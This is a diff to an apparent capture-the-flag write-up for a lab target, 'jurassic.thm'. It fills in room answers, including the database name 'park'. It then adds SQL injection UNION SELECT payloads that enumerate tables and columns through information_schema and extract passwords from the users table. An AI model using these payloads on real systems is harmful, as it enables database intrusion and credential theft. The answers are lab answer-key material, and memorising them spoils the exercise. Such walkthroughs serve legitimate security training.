@@ -29,13 +29,17 @@ Please connect to our network before deploying the machine.</p>
 <h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
 
 > 1.1. <em>What is the name of the SQL database serving the shop information?</em><br><a id='1.1'></a>
->> <code><strong>No answer needed</strong></code>
+>> <code><strong>park</strong></code>
 
 <br>
 
 > 1.2. <em>How many columns does the table have?</em><br><a id='1.2'></a>
->> <code><strong>____</strong></code>
+>> <code><strong>5</strong></code>
 
+<br>
+
+> 1.3. <em>What is the system version?</em><br><a id='1.3'></a>
+>> <code><strong>5</strong></code>
 
 <br>
 
@@ -151,6 +155,43 @@ But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output
 <br>
 
 ![image](https://github.com/user-attachments/assets/3d5d88a9-c949-4c3c-806d-5c51db1e747d)
+
+<p>Let´s have some fun ...</p>
+
+
+<pre><code>?id=5 union select 1,group_concat(table_name),2000000,1000,199 from information_schema.tables where table_schema = database()</code></pre>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/46ca00f2-7542-48f6-9919-296ee6db8379)
+
+<p>We can notice that there are <code>two tables</code>: <code>items</code> and <code>users</code></p>
+
+<br>
+
+<pre><code>?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"</code></pre>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4b3ca1be-e473-411d-8189-c2ea2d22111c)
+
+<br>
+
+http://jurassic.thm/item.php?id=5%20union%20select%201,password,3,4,5%20from%20users
+
+![image](https://github.com/user-attachments/assets/669a0148-a62f-48b6-a26d-84550fdcba17)
+
+<br>
+
+
+
+
+
+
+
+
+
+
 
 
 
